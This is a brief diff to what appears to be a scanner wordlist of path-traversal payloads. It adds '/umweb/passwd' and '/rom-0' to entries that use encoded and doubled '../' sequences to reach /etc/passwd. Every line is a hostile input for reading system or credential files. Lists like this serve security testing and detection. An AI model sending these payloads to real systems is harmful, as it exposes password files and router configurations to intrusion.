@@ -2,3 +2,5 @@
 /umweb/../etc/passwd
 /css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 /lib///....//....//....//....//....//....//....//....//etc//passwd
+/umweb/passwd
+/rom-0
